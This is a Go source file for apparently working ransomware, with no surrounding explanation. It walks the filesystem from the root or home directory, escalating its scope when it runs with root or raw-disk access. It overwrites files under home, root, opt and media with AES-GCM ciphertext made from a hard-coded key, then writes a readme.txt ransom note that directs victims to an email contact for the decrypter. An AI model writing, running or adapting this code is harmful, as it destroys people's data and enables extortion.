package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"os/user"
	"runtime"
	"strings"
	"time"

	"github.com/karrick/godirwalk"
)

//var Dir string = "/" // Insert starting directory

var Queue = make(chan string, 255)

var Root string

func isAuthority() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		return false
	}
	return true
}

func isRoot() bool {
	currentUser, err := user.Current()
	if err != nil {
		log.Fatalf("[isRoot] Unable to get current user: %s", err)
	}
	fmt.Println(currentUser.Username)
	return currentUser.Username == "root"
}

func MapFiles(Root string) {
	error := godirwalk.Walk(Root, &godirwalk.Options{
		Callback: func(path string, de *godirwalk.Dirent) error {
			if strings.Contains(path, "decrypter") || strings.Contains(path, ".bashrc") || strings.Contains(path, ".zshrc") || strings.Contains(path, ".profile") || strings.Contains(path, "bash") || strings.Contains(path, "sh") || strings.Contains(path, "zsh") || strings.Contains(path, "/.") {
				return nil
			} else if strings.Contains(path, "opt") || strings.Contains(path, "root") || strings.Contains(path, "home") || strings.Contains(path, "media") {
				Queue <- path
				return nil
			} else {
				return nil
			}
		},
		Unsorted: true,
	})

	if error != nil {
		fmt.Println(error)
	}
}

func Encrypt(plainText []byte, key []byte, Encrypted chan []byte, v string) {

	block, err := aes.NewCipher(key)

	if err != nil {
		fmt.Println(err)
	}

	gcm, err := cipher.NewGCM(block)

	if err != nil {
		fmt.Println(err)
	}

	nonce := make([]byte, gcm.NonceSize())
	_, err = io.ReadFull(rand.Reader, nonce)
	if err != nil {
		fmt.Println(err)
	}

	cypherText := gcm.Seal(nonce, nonce, plainText, nil)

	Encrypted <- cypherText
}

func main() {
	if runtime.GOOS == "windows" {
		//windows
		Root = os.Getenv("USERPROFILE")
		if isAuthority() {
			Root = "C:\\"
		}
	} else {
		//linux
		if isRoot() {
			Root = "/"
		} else {
			Root = os.Getenv("HOME") + "/"
		}
	}

	Encrypted := make(chan []byte, 100)
	cryptoKey := "686561646d696e64706172746e6572737265647465616d313333374031333337" //keygen.Keygen()
	contact := "pcardoso061@headmind.com"                                           // Insert contact email

	key, err := hex.DecodeString(cryptoKey)
	if err != nil {
		panic(err)
	}

	//use function mapfiles from explorer (gets every file recursive by decided dir except decrypter!)
	//go MapFiles()
	go MapFiles(Root)

	// for each file encrypt file with key in 644 perm

loop:
	for {
		select {
		case v := <-Queue:
			file, err := ioutil.ReadFile(v)
			if err != nil {
				continue
			}
			go Encrypt(file, key, Encrypted, v)
			ioutil.WriteFile(v, <-Encrypted, 0644)
		case <-time.After(5 * time.Second):
			fmt.Println("timeout 5")
			break loop
		}
	}

	msg := "Your files have been encrypted.\nContact " + contact + " to get the decrypter/ decrypt key."
	fmt.Println(msg)

	err = ioutil.WriteFile(Root+"/readme.txt", []byte(msg), 0644)
	if err != nil {
		panic(err)
	}
}
